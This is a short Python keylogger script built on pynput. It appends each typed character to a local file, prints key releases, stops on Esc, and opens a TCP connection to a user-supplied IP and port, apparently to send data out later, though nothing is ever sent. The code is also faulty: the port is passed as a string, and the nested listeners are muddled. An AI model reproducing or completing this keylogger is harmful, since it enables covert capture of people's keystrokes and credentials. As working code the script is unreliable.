import pynput
from pynput.keyboard import Controller, Listener, Key
from pynput import keyboard
import time
import json
import socket

TCP_IP = input("Enter your TCP IP: ")
TCP_PORT = input("Enter your TCP Port: ")
BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

class MyException(Exception): pass

def on_press(key):
    if key == keyboard.Key.esc:
        raise MyException(key)

def key_monitor(key):
    try:
        with open("result.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        pass


def typing(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press) as listener:
    try:
        with keyboard.Listener(on_press=key_monitor, on_release=typing) as listener2:
            listener2.join()
    except MyException as e:
        print('{0} was pressed'.format(e.args[0]))

s.close()
